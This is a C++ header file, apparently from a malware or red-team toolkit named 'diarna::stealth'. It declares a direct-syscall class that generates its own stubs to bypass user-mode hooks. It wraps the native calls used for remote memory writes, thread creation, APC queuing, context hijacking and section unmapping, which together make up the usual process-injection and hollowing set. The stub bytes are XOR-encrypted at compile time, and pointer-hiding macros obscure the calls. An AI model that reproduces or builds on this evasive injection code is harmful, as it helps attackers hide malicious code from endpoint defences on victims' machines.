#pragma once
#include <diarna/compiler_port.hpp>
#include <string>
#include <cstdint>
#include <vector>
#include <span>

namespace diarna::stealth {

struct SyscallStub {
    uint16_t ssdt_index;
    const char* name;
    void* stub_address;
};

class DirectSyscalls {
public:
    static DirectSyscalls& instance();

    bool initialize();

    NTSTATUS NtAllocateVirtualMemory(HANDLE proc, PVOID* base, ULONG_PTR zero,
                                      PSIZE_T size, ULONG type, ULONG protect);
    NTSTATUS NtWriteVirtualMemory(HANDLE proc, PVOID base, PVOID buffer,
                                   SIZE_T size, PSIZE_T written);
    NTSTATUS NtReadVirtualMemory(HANDLE proc, PVOID base, PVOID buffer,
                                  SIZE_T size, PSIZE_T read);
    NTSTATUS NtProtectVirtualMemory(HANDLE proc, PVOID* base, PSIZE_T size,
                                     ULONG protect, PULONG old);
    NTSTATUS NtCreateThreadEx(PHANDLE thread, ACCESS_MASK access, PVOID obj_attr,
                               HANDLE proc, PVOID start, PVOID param, ULONG flags,
                               ULONG_PTR zero_bits, SIZE_T stack_size,
                               SIZE_T max_stack, PVOID attr_list);
    NTSTATUS NtOpenProcess(PHANDLE handle, ACCESS_MASK access,
                            PVOID obj_attr, PVOID client_id);
    NTSTATUS NtQuerySystemInformation(ULONG sys_class, PVOID info,
                                       ULONG size, PULONG ret_len);
    NTSTATUS NtClose(HANDLE handle);
    NTSTATUS NtQueueApcThread(HANDLE thread, PVOID apc_routine,
                               PVOID arg1, PVOID arg2, PVOID arg3);
    NTSTATUS NtGetContextThread(HANDLE thread, PCONTEXT ctx);
    NTSTATUS NtSetContextThread(HANDLE thread, PCONTEXT ctx);
    NTSTATUS NtResumeThread(HANDLE thread, PULONG suspend_count);
    NTSTATUS NtSuspendThread(HANDLE thread, PULONG prev_count);
    NTSTATUS NtUnmapViewOfSection(HANDLE proc, PVOID base);
    NTSTATUS NtCreateSection(PHANDLE section, ACCESS_MASK access, PVOID obj_attr,
                              PLARGE_INTEGER max_size, ULONG protect,
                              ULONG alloc_attr, HANDLE file);
    NTSTATUS NtMapViewOfSection(HANDLE section, HANDLE proc, PVOID* base,
                                 ULONG_PTR zero_bits, SIZE_T commit,
                                 PLARGE_INTEGER offset, PSIZE_T view_size,
                                 ULONG inherit, ULONG alloc_type, ULONG protect);

    template<typename... Args>
    auto syscall(uint16_t index, Args&&... args) -> NTSTATUS {
        INDIRECT_BRANCH;
        uint8_t* stub = get_stub(index);
        if (!stub) return (NTSTATUS)0xC00000BB;
        using SyscallFn = NTSTATUS(NTAPI*)(Args...);
        auto fn = reinterpret_cast<SyscallFn>(stub);
        return HIDE_PTR(fn)(std::forward<Args>(args)...);
    }

    void refresh_syscall_numbers();
    void* get_stub_region_address() const { return stub_region_; }

private:
    DirectSyscalls() = default;
    ~DirectSyscalls();

    bool resolve_ssdt();
    void generate_stubs();
    uint8_t* get_stub(uint16_t index);
    uint16_t resolve_index(const char* name, HMODULE ntdll);

    struct SSDTEntry {
        uint16_t index;
        std::string name;
        uint8_t* stub;
    };

    enum CachedIndex : uint8_t {
        CI_NtAllocateVirtualMemory = 0, CI_NtWriteVirtualMemory,
        CI_NtReadVirtualMemory, CI_NtProtectVirtualMemory,
        CI_NtCreateThreadEx, CI_NtOpenProcess,
        CI_NtQuerySystemInformation, CI_NtClose,
        CI_NtQueueApcThread, CI_NtGetContextThread,
        CI_NtSetContextThread, CI_NtResumeThread,
        CI_NtSuspendThread, CI_NtUnmapViewOfSection,
        CI_NtCreateSection, CI_NtMapViewOfSection,
        CI_COUNT
    };

    std::vector<SSDTEntry> ssdt_;
    uint8_t* cached_stubs_[CI_COUNT] = {};
    void* stub_region_;
    size_t stub_region_size_;
    public:
    bool is_initialized() const { return initialized_; }
    private:
    bool initialized_ = false;

    static constexpr size_t STUB_SIZE = 32;
};

inline constexpr uint32_t DD_STUB_SEED = (uint32_t)(__COUNTER__ * 2654435761u + 0xDEAD);
inline constexpr uint8_t dd_pos_key(size_t i) {
    uint32_t s = DD_STUB_SEED;
    for (size_t k = 0; k <= i; ++k) s = s * 1103515245u + 12345u;
    return (uint8_t)(s >> 16);
}
inline constexpr uint8_t DD_SYSCALL_STUB_X64_ENC[20] = {
    (uint8_t)(0x4C ^ dd_pos_key(0)), (uint8_t)(0x8B ^ dd_pos_key(1)), (uint8_t)(0xD1 ^ dd_pos_key(2)),
    (uint8_t)(0xB8 ^ dd_pos_key(3)), (uint8_t)(0x00 ^ dd_pos_key(4)), (uint8_t)(0x00 ^ dd_pos_key(5)), (uint8_t)(0x00 ^ dd_pos_key(6)), (uint8_t)(0x00 ^ dd_pos_key(7)),
    (uint8_t)(0x48 ^ dd_pos_key(8)), (uint8_t)(0xB8 ^ dd_pos_key(9)), (uint8_t)(0x00 ^ dd_pos_key(10)), (uint8_t)(0x00 ^ dd_pos_key(11)), (uint8_t)(0x00 ^ dd_pos_key(12)), (uint8_t)(0x00 ^ dd_pos_key(13)), (uint8_t)(0x00 ^ dd_pos_key(14)), (uint8_t)(0x00 ^ dd_pos_key(15)), (uint8_t)(0x00 ^ dd_pos_key(16)), (uint8_t)(0x00 ^ dd_pos_key(17)),
    (uint8_t)(0xFF ^ dd_pos_key(18)), (uint8_t)(0xE0 ^ dd_pos_key(19))
};
inline constexpr uint8_t DD_SYSCALL_STUB_WOW64_ENC[15] = {
    (uint8_t)(0xB8 ^ dd_pos_key(0)),  (uint8_t)(0xFF ^ dd_pos_key(1)), (uint8_t)(0xFF ^ dd_pos_key(2)), (uint8_t)(0xFF ^ dd_pos_key(3)), (uint8_t)(0xFF ^ dd_pos_key(4)),
    (uint8_t)(0x33 ^ dd_pos_key(5)),  (uint8_t)(0xD2 ^ dd_pos_key(6)),
    (uint8_t)(0x64 ^ dd_pos_key(7)),  (uint8_t)(0xFF ^ dd_pos_key(8)), (uint8_t)(0x15 ^ dd_pos_key(9)), (uint8_t)(0xC0 ^ dd_pos_key(10)), (uint8_t)(0x00 ^ dd_pos_key(11)), (uint8_t)(0x00 ^ dd_pos_key(12)), (uint8_t)(0x00 ^ dd_pos_key(13)),
    (uint8_t)(0xC3 ^ dd_pos_key(14))
};

} // namespace diarna::stealth
